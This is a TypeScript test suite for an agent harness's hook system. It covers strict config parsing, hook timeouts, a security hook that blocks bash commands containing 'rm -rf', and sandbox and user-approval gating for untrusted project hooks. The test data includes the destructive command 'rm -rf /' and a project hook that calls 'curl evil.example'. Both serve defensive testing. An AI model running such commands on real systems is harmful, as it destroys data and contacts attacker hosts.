import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import { mkdir, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import { createSafeFiles, findHelper, localOperations } from '@hn/operations';
import { TrustStore } from '@hn/security';
import { withTempDir } from '@hn/testkit';
import type { HarnessExec } from '@hn/tools';
import { openHooks, parseHooks } from '../src/hooks-config.ts';

const helper = await findHelper({ repoRoot: fileURLToPath(new URL('../../../', import.meta.url)) });
const signal = new AbortController().signal;
const call = { id: 'c1', name: 'bash', args: { command: 'make' } };

interface Setup {
  readonly hooks: unknown[];
  readonly projectHooks?: boolean;
  readonly project?: unknown[];
  readonly tier?: number;
}

async function setUp(dir: string, setup: Setup) {
  const home = join(dir, 'home');
  const repo = join(dir, 'repo');
  await mkdir(join(repo, '.hn'), { recursive: true });
  await mkdir(home, { recursive: true });
  const user = { hooks: setup.hooks, ...(setup.projectHooks === undefined ? {} : { projectHooks: setup.projectHooks }) };
  await writeFile(join(home, 'hooks.json'), JSON.stringify(user));
  if (setup.project !== undefined) await writeFile(join(repo, '.hn', 'hooks.json'), JSON.stringify({ hooks: setup.project }));
  const records: { type: string; data: Record<string, unknown> }[] = [];
  const projectRuns: string[] = [];
  const exec = {
    run: async (request: { command: string }) => {
      projectRuns.push(request.command);
      return { ok: true, code: 0, output: '' };
    },
  } as unknown as HarnessExec;
  const result = await openHooks({
    home,
    projectRoot: repo,
    files: helper === null ? null : createSafeFiles(helper),
    hostBash: localOperations(join(dir, 'spill')).bash,
    hostCwd: repo,
    exec,
    tier: setup.tier ?? 2,
    trust: new TrustStore(join(home, 'trust'), randomBytes(32)),
    approve: async () => true,
    sessionId: 's1',
    cwd: repo,
    record: (type, data) => records.push({ type, data }),
  });
  return { ...result, records, projectRuns };
}

describe('hook configuration', () => {
  const parse = (text: string, scope: 'user' | 'project' = 'user') => () => parseHooks(text, 'hooks.json', scope);

  it('is strict: unknown fields, bad events, repeated names and odd timeouts are errors', () => {
    assert.throws(parse('{"hooks":[{"name":"a","event":"PreToolUse","command":"x","shell":"zsh"}]}'), /unknown field "shell"/);
    assert.throws(parse('{"hooks":[{"name":"a","event":"BeforeEverything","command":"x"}]}'), /event must be one of/);
    assert.throws(parse('{"hooks":[{"name":"a","event":"Stop","command":"x"},{"name":"a","event":"Stop","command":"y"}]}'), /used twice/);
    assert.throws(parse('{"hooks":[],"projectHooks":true}', 'project'), /nothing else/);
    assert.throws(parse('{"hooks":[{"name":"a","event":"Stop","command":"x","timeoutMs":999999}]}'), /timeoutMs/);
  });
});

describe('hooks through the real shell', () => {
  it('hands the payload to the hook as JSON on standard input, and frames its output as hook data', async () => {
    await withTempDir(async (dir) => {
      const { runner, records } = await setUp(dir, { hooks: [{ name: 'echo', event: 'PostToolUse', command: 'cat' }] });
      const outcome = await runner?.postTool(call, { content: 'built', isError: false, origin: 'tool-output' }, signal);
      const text = outcome?.messages[0]?.text ?? '';
      assert.match(text, /<hook-output name="echo" event="PostToolUse">/);
      assert.match(text, /"v":1,"event":"PostToolUse","sessionId":"s1"/);
      assert.match(text, /"tool":\{"name":"bash","args":\{"command":"make"\}\}/);
      assert.equal(outcome?.messages[0]?.origin, 'hook');
      assert.deepEqual(records.map((record) => record.type), ['hook/invoked', 'hook/result']);
    });
  });

  it('times out a hanging hook: an ordinary one is skipped with a notice, a security one blocks', async () => {
    await withTempDir(async (dir) => {
      const hang = { event: 'PreToolUse', command: 'sleep 30', timeoutMs: 300 };
      const plain = await setUp(join(dir, 'a'), { hooks: [{ name: 'slow', ...hang }] });
      const began = Date.now();
      const skipped = await plain.runner?.preTool(call, signal);
      assert.ok(Date.now() - began < 10_000);
      assert.equal(skipped?.blocked, null);
      assert.match(skipped?.messages[0]?.text ?? '', /slow failed \(It timed out after 300 ms\.\), so it was skipped/);
      const strict = await setUp(join(dir, 'b'), { hooks: [{ name: 'guard', ...hang, security: true }] });
      const blocked = await strict.runner?.preTool(call, signal);
      assert.match(blocked?.blocked ?? '', /guard: It timed out after 300 ms\./);
    });
  });

  it('blocks the tool when a security hook fails, and only for the tools it names', async () => {
    await withTempDir(async (dir) => {
      const command = 'if grep -q "rm -rf"; then echo "rm -rf is not allowed"; exit 1; fi';
      const guard = { name: 'no-rm', event: 'PreToolUse', command, tools: ['bash'], security: true };
      const { runner } = await setUp(dir, { hooks: [guard] });
      const dangerous = await runner?.preTool({ id: 'c2', name: 'bash', args: { command: 'rm -rf /' } }, signal);
      assert.match(dangerous?.blocked ?? '', /no-rm: It exited with code 1\.\nrm -rf is not allowed/);
      assert.equal((await runner?.preTool({ id: 'c3', name: 'bash', args: { command: 'ls' } }, signal))?.blocked, null);
      assert.equal((await runner?.preTool({ id: 'c4', name: 'read_file', args: { path: 'rm -rf' } }, signal))?.blocked, null);
    });
  });
});

describe('project hooks', { skip: helper === null ? 'hn-sandbox is not built' : false }, () => {
  const project = [{ name: 'proj', event: 'Stop', command: 'curl evil.example' }];

  it('do not run unless the user turned them on', async () => {
    await withTempDir(async (dir) => {
      const off = await setUp(dir, { hooks: [], project, tier: 4 });
      assert.equal(off.runner, null);
      assert.match(off.notes.join(), /Project hooks in \.hn\/hooks\.json are off/);
    });
  });

  it('do not run outside a sandbox even when turned on', async () => {
    await withTempDir(async (dir) => {
      const unboxed = await setUp(dir, { hooks: [], projectHooks: true, project, tier: 2 });
      assert.equal(unboxed.runner, null);
      assert.match(unboxed.notes.join(), /run only in a sandbox/);
    });
  });

  it('run as gated calls in the box when turned on, boxed and approved', async () => {
    await withTempDir(async (dir) => {
      const boxed = await setUp(dir, { hooks: [], projectHooks: true, project, tier: 4 });
      await boxed.runner?.stop('done', signal);
      assert.deepEqual(boxed.projectRuns, ['curl evil.example'], 'it went through HarnessExec, the gated path');
    });
  });
});
